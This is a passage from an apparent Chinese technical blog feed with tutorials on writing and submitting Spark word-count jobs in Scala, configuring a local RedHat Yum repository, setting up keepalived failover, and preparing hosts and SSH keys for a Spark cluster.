punctuation">{</span>SparkContext<span class="token punctuation">,</span> SparkConf<span class="token punctuation">}</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span><span class="token punctuation">{</span>Level<span class="token punctuation">,</span> Logger<span class="token punctuation">}</span><span class="token keyword">object</span> Demo <span class="token punctuation">{</span>  <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token punctuation">{</span>    Logger<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"org"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>Level<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span>    <span class="token keyword">val</span> sparkConf <span class="token operator">=</span> <span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"WordCount"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local"</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> sc <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span>sparkConf<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 词频统计</span>    <span class="token keyword">val</span> dataRDD <span class="token operator">=</span> sc<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"D:\\SparkProject\\data\\test.txt"</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span>flatMap<span class="token punctuation">(</span>_<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span>map<span class="token punctuation">(</span>x <span class="token keyword">=></span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span>reduceByKey<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token keyword">=></span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span>    dataRDD<span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、运行程序"><a href="#五、运行程序" class="headerlink" title="五、运行程序"></a>五、运行程序</h2><ol><li>直接运行</li></ol><p>右键直接运行<br>​</p><ol start="2"><li>打包运行</li></ol><p>选择文件-&gt;项目结构<br>&nbsp; &nbsp;&nbsp;<img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617895595499-b8cf957f-5899-4019-95fc-aa22255fcc5a.png#height=349&amp;id=bWRfR&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=697&amp;originWidth=997&amp;originalType=binary%E2%88%B6=1&amp;size=123284&amp;status=done&amp;style=none&amp;width=498.5" alt="image.png"><br>然后如图所示进行如下操作<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617895671454-2eb3dfa7-8755-4615-b4ad-d77fa6f6a9a8.png#height=481&amp;id=DQppZ&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=961&amp;originWidth=1254&amp;originalType=binary%E2%88%B6=1&amp;size=80054&amp;status=done&amp;style=none&amp;width=627" alt="image.png"><br>选择主类<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617895751020-befd14c8-3222-4d35-aaed-b3f115598983.png#height=319&amp;id=EVNax&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=638&amp;originWidth=821&amp;originalType=binary%E2%88%B6=1&amp;size=34746&amp;status=done&amp;style=none&amp;width=410.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617895828390-6db7b24c-28fa-48bc-894f-9fc879cfc755.png#height=243&amp;id=ZC1dR&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=486&amp;originWidth=619&amp;originalType=binary%E2%88%B6=1&amp;size=32882&amp;status=done&amp;style=none&amp;width=309.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617895882712-fe4bccfb-b3bb-495f-93e9-90d946fedfef.png#height=481&amp;id=b6Kcw&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=961&amp;originWidth=1254&amp;originalType=binary%E2%88%B6=1&amp;size=153115&amp;status=done&amp;style=none&amp;width=627" alt="image.png"><br>移除不需要的依赖包，只保留最后一个<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617895940937-6688d579-df09-4e33-ba12-8d5926a9b898.png#height=481&amp;id=hRQe2&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=961&amp;originWidth=1254&amp;originalType=binary%E2%88%B6=1&amp;size=158637&amp;status=done&amp;style=none&amp;width=627" alt="image.png"><br>构建<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617896003032-0b339a89-7af0-4fef-a24b-796395aaf515.png#height=217&amp;id=ntpEp&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=434&amp;originWidth=885&amp;originalType=binary%E2%88%B6=1&amp;size=77523&amp;status=done&amp;style=none&amp;width=442.5" alt="image.png"><br>上传到 spark 集群后运行</p><pre class="line-numbers language-bash"><code class="language-bash">spark-submit --class org.simple.Demo --master spark://spark0:7077 ./SparkDemo.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark </tag>
            
            <tag> Maven </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA开发Spark应用(Scala)</title>
      <link href="/post/51629339.html"/>
      <url>/post/51629339.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h2><ol><li>Scala 插件</li><li>JDK</li><li>Scala SDK</li><li>Spark</li></ol><h2 id="二、创建项目"><a href="#二、创建项目" class="headerlink" title="二、创建项目"></a>二、创建项目</h2><ol><li>点击新建项目</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617110846305-bd65ead5-6b7a-4afb-a1c8-57b113605db0.png#height=410&amp;id=likg6&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=606&amp;originWidth=891&amp;originalType=binary%E2%88%B6=1&amp;size=47860&amp;status=done&amp;style=none&amp;width=603" alt="image.png"></p><ol start="2"><li>选择新建 Scala 项目</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617110975933-60c59d30-1209-4df0-a993-b9980165f366.png#height=568&amp;id=sU9k3&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=755&amp;originWidth=802&amp;originalType=binary%E2%88%B6=1&amp;size=78018&amp;status=done&amp;style=none&amp;width=603" alt="image.png"></p><ol start="3"><li>填写相应的信息</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617111038031-1027adcb-4913-4915-bce0-e22077e55f2d.png#height=569&amp;id=WdZdI&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=755&amp;originWidth=802&amp;originalType=binary%E2%88%B6=1&amp;size=51795&amp;status=done&amp;style=none&amp;width=604" alt="image.png"></p><ol start="4"><li>选择 <em>文件-&gt;项目结构</em></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617111384980-ea83705f-84b3-4412-a518-0ed09d4196a6.png#height=526&amp;id=nDft8&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=712&amp;originWidth=844&amp;originalType=binary%E2%88%B6=1&amp;size=54164&amp;status=done&amp;style=none&amp;width=623" alt="image.png"></p><ol start="5"><li>选择 JAVA</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617111415011-59c36091-99bd-42fe-bf7c-c96f676a791d.png#height=168&amp;id=wvPTD&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=168&amp;originWidth=205&amp;originalType=binary%E2%88%B6=1&amp;size=12116&amp;status=done&amp;style=none&amp;width=205" alt="image.png"></p><ol start="6"><li>选择 spark 目录下的 jars</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617111467084-a8cfc6cd-cf07-4c75-8848-d13d83008146.png#height=458&amp;id=aOx0S&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=484&amp;originWidth=748&amp;originalType=binary%E2%88%B6=1&amp;size=76416&amp;status=done&amp;style=none&amp;width=708" alt="image.png"></p><h2 id="三、程序编写"><a href="#三、程序编写" class="headerlink" title="三、程序编写"></a>三、程序编写</h2><p>词频统计 Demo：</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">package</span> org<span class="token punctuation">.</span>spark<span class="token punctuation">.</span>demo<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span><span class="token punctuation">{</span>SparkConf<span class="token punctuation">,</span> SparkContext<span class="token punctuation">}</span><span class="token keyword">object</span> Demo <span class="token punctuation">{</span>  <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Create a SparkContext to initialize Spark</span>    <span class="token keyword">val</span> conf <span class="token operator">=</span> <span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span>    conf<span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local"</span><span class="token punctuation">)</span>    conf<span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"Word Count"</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> sc <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span>conf<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// Load the text into a Spark RDD, which is a distributed representation of each line of text</span>    <span class="token keyword">val</span> textFile <span class="token operator">=</span> sc<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"file:///simple/test.txt"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// word count</span>    <span class="token keyword">val</span> counts <span class="token operator">=</span> textFile<span class="token punctuation">.</span>flatMap<span class="token punctuation">(</span>line <span class="token keyword">=></span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span>map<span class="token punctuation">(</span>word <span class="token keyword">=></span> <span class="token punctuation">(</span>word<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span>reduceByKey<span class="token punctuation">(</span>_ <span class="token operator">+</span> _<span class="token punctuation">)</span>    counts<span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span>println<span class="token punctuation">(</span><span class="token string">"Total words: "</span> <span class="token operator">+</span> counts<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    counts<span class="token punctuation">.</span>saveAsTextFile<span class="token punctuation">(</span><span class="token string">"/tmp/shakespeareWordCount"</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、构建打包，提交到-spark-环境运行"><a href="#四、构建打包，提交到-spark-环境运行" class="headerlink" title="四、构建打包，提交到 spark 环境运行"></a>四、构建打包，提交到 spark 环境运行</h2><ol><li>选择 _文件-&gt;项目结构_，然后：</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617111940864-2c015aeb-6abe-4ad2-a8a6-8a3c9455d915.png#height=376&amp;id=FZk8W&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=424&amp;originWidth=598&amp;originalType=binary%E2%88%B6=1&amp;size=67247&amp;status=done&amp;style=none&amp;width=530" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617111855487-a6a47121-fe59-45b1-b647-431855af312e.png#height=410&amp;id=CkJm8&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=410&amp;originWidth=532&amp;originalType=binary%E2%88%B6=1&amp;size=46282&amp;status=done&amp;style=none&amp;width=532" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617112163745-dd32818d-3ccb-4c6a-a13f-865ec2e964ef.png#height=244&amp;id=T286k&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=244&amp;originWidth=331&amp;originalType=binary%E2%88%B6=1&amp;size=48768&amp;status=done&amp;style=none&amp;width=331" alt="image.png"></p><ol start="2"><li>生成 JAR 包路径：out/artifacts/DemoProject_jar/DemoProject.jar</li><li>将 JAR 包上传至 Spark 集群，执行：</li></ol><pre class="line-numbers language-bash"><code class="language-bash">spark-submit --class org.spark.demo.Demo /root/jars/DemoProject.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Spark </tag>
            
            <tag> 开发 </tag>
            
            <tag> Scala </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedHat配置本地Yum源</title>
      <link href="/post/9f4704e8.html"/>
      <url>/post/9f4704e8.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、配置方法"><a href="#一、配置方法" class="headerlink" title="一、配置方法"></a>一、配置方法</h2><ol><li>Yum 配置文件存放路径</li></ol><p><strong>/etc/yum.repos.d/*.repo</strong><br><strong><em>​</em></strong></p><ol start="2"><li>备份配置文件</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /etc/yum.repos.d/<span class="token function">mkdir</span> repo_bak<span class="token function">mv</span> *.repo repo_bak/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>在该目录下添加配置文件</li></ol><p><strong>local.repo</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>c8-media-AppStream<span class="token punctuation">]</span>name<span class="token operator">=</span>AppStreambaseurl<span class="token operator">=</span>file:///mnt/cdrom/AppStreamgpgcheck<span class="token operator">=</span>0enabled<span class="token operator">=</span>1<span class="token punctuation">[</span>c8-media-BaseOS<span class="token punctuation">]</span>name<span class="token operator">=</span>BaseOSbaseurl<span class="token operator">=</span>file:///mnt/cdrom/BaseOSgpgcheck<span class="token operator">=</span>0enabled<span class="token operator">=</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>连接 ISO 系统镜像的 CD/DVD</li></ol><p>​</p><ol start="5"><li>创建文件夹</li></ol><p><strong>mkdir /mnt/cdrom</strong><br><strong><em>​</em></strong></p><ol start="6"><li>挂载镜像</li></ol><p><strong>mount /dev/sr0 /mnt/cdrom</strong><br><strong><em>​</em></strong></p><ol start="7"><li>清空重建 cache</li></ol><pre class="line-numbers language-bash"><code class="language-bash">yum clean allyum makecache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="8"><li>开机自动挂载(不推荐)</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"/dev/sr0 /mnt/cdrom iso9660 defaults 0 0"</span> <span class="token operator">>></span> /etc/fstab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="二、自动配置脚本"><a href="#二、自动配置脚本" class="headerlink" title="二、自动配置脚本"></a>二、自动配置脚本</h2><p>编辑脚本文件：yum.sh</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 自动配置本地yum源</span><span class="token comment" spellcheck="true"># 需要先挂载💿光盘镜像ISO</span><span class="token function">cd</span> /etc/yum.repos.d <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf  *<span class="token function">cat</span> <span class="token operator">></span>rhel7.repo<span class="token operator">&lt;&lt;</span><span class="token string">EOF[rhel7]name=rhel7baseurl=file:///media/cdromenabled=1gpgcheck=0EOF</span><span class="token function">mkdir</span> -p /media/cdrom<span class="token function">mount</span> /dev/cdrom /media/cdrom<span class="token keyword">echo</span> <span class="token string">"/dev/cdrom /media/cdrom iso9660 defaults 0 0"</span> <span class="token operator">>></span> /etc/fstabyum clean allyum makecache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chmod</span> 755 yum.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 云计算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 运维 </tag>
            
            <tag> Yum </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>keepalived配置</title>
      <link href="/post/77447fe2.html"/>
      <url>/post/77447fe2.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、基本信息"><a href="#一、基本信息" class="headerlink" title="一、基本信息"></a>一、基本信息</h2><p>代理主机 01：<strong>192.168.198.99</strong><br>代理主机 02：<strong>192.168.198.98</strong><br>虚拟 IP：<strong>192.168.198.88</strong><br>网卡：<strong>ens33</strong></p><h2 id="二、配置文件"><a href="#二、配置文件" class="headerlink" title="二、配置文件"></a>二、配置文件</h2><h3 id="1-etc-hosts"><a href="#1-etc-hosts" class="headerlink" title="1. /etc/hosts"></a>1. /etc/hosts</h3><pre class="line-numbers language-basic"><code class="language-basic"><span class="token number">192.168</span><span class="token number">.198.99</span> proxy<span class="token operator">-</span><span class="token number">1</span><span class="token number">192.168</span><span class="token number">.198.98</span> proxy<span class="token operator">-</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-etc-keepalived-keepalived-conf"><a href="#2-etc-keepalived-keepalived-conf" class="headerlink" title="2. /etc/keepalived/keepalived.conf"></a>2. /etc/keepalived/keepalived.conf</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token operator">!</span> Configuration File for keepalivedglobal_defs <span class="token punctuation">{</span>   notification_email <span class="token punctuation">{</span>        chenhaikun8@gmail<span class="token punctuation">.</span>com   <span class="token punctuation">}</span>   notification_email_from keepalived@vmware<span class="token punctuation">.</span>com   smtp_server <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span>   router_id <span class="token keyword">proxy</span><span class="token operator">-</span><span class="token number">1</span>   vrrp_mcast_group4 <span class="token number">224.4</span><span class="token punctuation">.</span><span class="token number">4.4</span><span class="token punctuation">}</span>vrrp_script chk_proxy <span class="token punctuation">{</span>    script <span class="token string">"/etc/keepalived/proxy_check.sh"</span>    interval <span class="token number">2</span>    weight <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">}</span>vrrp_instance VI_1 <span class="token punctuation">{</span>    state BACKUP    nopreempt    interface <span class="token class-name">ens33</span>    virtual_router_id <span class="token number">11</span>    priority <span class="token number">100</span>    advert_int <span class="token number">1</span>    authentication <span class="token punctuation">{</span>        auth_type PASS        auth_pass <span class="token number">1111</span>    <span class="token punctuation">}</span>    virtual_ipaddress <span class="token punctuation">{</span>        <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">198.88</span><span class="token operator">/</span><span class="token number">24</span> dev ens33 label ens33<span class="token punctuation">:</span><span class="token number">1</span>    <span class="token punctuation">}</span>    track_script <span class="token punctuation">{</span>        chk_proxy    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-etc-keepalived-proxy-check-sh"><a href="#3-etc-keepalived-proxy-check-sh" class="headerlink" title="3. /etc/keepalived/proxy_check.sh"></a>3. /etc/keepalived/proxy_check.sh</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token comment" spellcheck="true">#!/bin/bash</span><span class="token comment" spellcheck="true"># === nginx prxy check script ===</span>netstat <span class="token operator">-</span>nlpt <span class="token operator">|</span> grep <span class="token operator">-</span>w <span class="token string">"80"</span> <span class="token operator">&amp;</span><span class="token operator">></span><span class="token operator">></span> <span class="token operator">/</span>dev<span class="token operator">/</span>null<span class="token keyword">if</span> <span class="token punctuation">[</span> $<span class="token operator">?</span> <span class="token operator">-</span>ne <span class="token number">0</span> <span class="token punctuation">]</span>then    systemctl stop keepalivedfi    exit <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 云计算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 运维 </tag>
            
            <tag> 高可用 </tag>
            
            <tag> keepalived </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spark集群部署</title>
      <link href="/post/6b5ff5c0.html"/>
      <url>/post/6b5ff5c0.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、集群架构"><a href="#一、集群架构" class="headerlink" title="一、集群架构"></a>一、集群架构</h2><p>部署系统是第一件事，那么系统部署成功以后，各个节点都启动了哪些服务？服务之间的关联是什么，服务之间的配合是怎样的？<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1616416690501-97eccfeb-66e8-47ed-a11b-cdc420cdc549.png#height=2374&amp;id=p61MG&amp;originHeight=2374&amp;originWidth=3012&amp;originalType=binary%E2%88%B6=1&amp;size=0&amp;status=done&amp;style=none&amp;width=3012"></p><h2 id="二、主机设置"><a href="#二、主机设置" class="headerlink" title="二、主机设置"></a>二、主机设置</h2><h3 id="1-主机信息"><a href="#1-主机信息" class="headerlink" title="1. 主机信息"></a>1. 主机信息</h3><table><thead><tr><th><strong>Host</strong></th><th><strong>hostname</strong></th><th><strong>Type</strong></th></tr></thead><tbody><tr><td>192.168.2.20</td><td>spark0</td><td>Master</td></tr><tr><td>192.168.2.21</td><td>spark1</td><td>Worker</td></tr><tr><td>192.168.2.22</td><td>spark2</td><td>Worker</td></tr><tr><td>192.168.2.23</td><td>spark3</td><td>Worker</td></tr></tbody></table><h3 id="2-网络配置-设置静态-IP"><a href="#2-网络配置-设置静态-IP" class="headerlink" title="2. 网络配置-设置静态 IP"></a>2. 网络配置-设置静态 IP</h3><p>Centos：**/etc/sysconfig/network-scripts/ifcfg-ens3**</p><pre class="line-numbers language-bash"><code class="language-bash">TYPE<span class="token operator">=</span>EthernetPROXY_METHOD<span class="token operator">=</span>noneBROWSER_ONLY<span class="token operator">=</span>noBOOTPROTO<span class="token operator">=</span>static            <span class="token comment" spellcheck="true"># 静态IP</span>DEFROUTE<span class="token operator">=</span>yesIPV4_FAILURE_FATAL<span class="token operator">=</span>noIPV6INIT<span class="token operator">=</span>yesIPV6_AUTOCONF<span class="token operator">=</span>yesIPV6_DEFROUTE<span class="token operator">=</span>yesIPV6_FAILURE_FATAL<span class="token operator">=</span>noIPV6_ADDR_GEN_MODE<span class="token operator">=</span>stable-privacyNAME<span class="token operator">=</span>ens33UUID<span class="token operator">=</span>0be22931-2f93-49ba-a410-6d366009dd1eDEVICE<span class="token operator">=</span>ens33ONBOOT<span class="token operator">=</span>yesIPADDR<span class="token operator">=</span>192.168.2.20          <span class="token comment" spellcheck="true"># 设置IP地址</span>NETMASK<span class="token operator">=</span>255.255.255.0        <span class="token comment" spellcheck="true"># 设置子网掩码</span>GATEWAY<span class="token operator">=</span>192.168.2.2          <span class="token comment" spellcheck="true"># 设置网关</span>DNS1<span class="token operator">=</span>192.168.2.2             <span class="token comment" spellcheck="true"># 设置dns1</span>DNS2<span class="token operator">=</span>114.114.114.114         <span class="token comment" spellcheck="true"># 设置dns2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-设置-hostname"><a href="#3-设置-hostname" class="headerlink" title="3. 设置 hostname"></a>3. 设置 hostname</h3><pre class="line-numbers language-bash"><code class="language-bash">hostnamectl set-hostname sparkN<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-设置-hosts"><a href="#4-设置-hosts" class="headerlink" title="4. 设置 hosts"></a>4. 设置 hosts</h3><p>在 4 台主机上分别修改 <strong>/etc/hosts</strong> ，添加以下内容</p><pre class="line-numbers language-bash"><code class="language-bash">192.168.2.20 spark0192.168.2.21 spark1192.168.2.22 spark2192.168.2.23 spark3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>测试</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ping</span> spark1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-公钥私钥配置"><a href="#5-公钥私钥配置" class="headerlink" title="5. 公钥私钥配置"></a>5. 公钥私钥配置</h3><p>在每台主机上产生新的<strong>rsa 公钥私钥</strong>文件，并统一拷贝到一个<strong>authorized_keys</strong>文件中<br>（1）登录<strong>spark0</strong>，输入命令：</p><pre class="line-numbers language-bash"><code class="language-bash">ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>三次回车后，**.ssh<strong>目录下将会产生</strong>id_rsa<strong>，</strong>id_rsa.pub<strong>文件，</strong>其他主机**也使用该方式产生密钥文件。</p></blockquote><p>（2）登录<strong>spark0</strong>，输入命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> .ssh<span class="token function">cat</span> id_rsa.pub <span class="token operator">>></span> authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>将<strong>id_rsa.pub</strong>公钥内容拷贝到<strong>authorized_keys</strong>文件中</p></blockquote><p>（3）登录其它主机，将其它主机的公钥文件内容都拷贝到<strong>spark0</strong>主机上的<strong>authorized_keys</strong>文件中，命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 登录spark1，将公钥拷贝到spark0的authorized_keys中</span>ssh-copy-id -i spark0<span class="token comment" spellcheck="true"># 登录spark2，将公钥拷贝到spark0的authorized_keys中</span>ssh-copy-id -i spark0<span class="token comment" spellcheck="true"># 登录spark3，将公钥拷贝到spark0的authorized_keys中</span>ssh-copy-id -i spark0<span class="token comment" spellcheck="true"># 登录spark0，查看authorized_keys是否成功</span><span class="token function">cd</span> .ssh <span class="token operator">&amp;</span> <span class="token function">cat</span> authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-授权-authorized-keys-文件"><a href="#6-授权-authorized-keys-文件" class="headerlink" title="6. 授权 authorized_keys 文件"></a>6. 授权 authorized_keys 文件</h3><p>（1）登录<strong>spark0</strong>，输入命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> .ssh<span class="token function">chmod</span> 600 authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="7-将授权文件分发到其他主机上"><a href="#7-将授权文件分发到其他主机上" class="headerlink" title="7. 将授权文件分发到其他主机上"></a>7. 将授权文件分发到其他主机上</h3><p>（1）登录 spark0，将授权文件拷贝到 spark1、spark2…，命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 拷贝到spark1上</span><span class="token function">scp</span> /root/.ssh/authorized_keys spark1:/root/.ssh/<span class="token comment" spellcheck="true"># 拷贝到spark2上</span><span class="token function">scp</span> /root/.ssh/authorized_keys spark2:/root/.ssh/<span class="token comment" spellcheck="true"># 拷贝到spark3上</span><span class="token function">scp</span> /root/.ssh/authorized_keys spark3:/root/.ssh/<span class="token comment" spellcheck="true"># 测试</span><span class="token function">ssh</span> spark1<span aria-hidden="true" 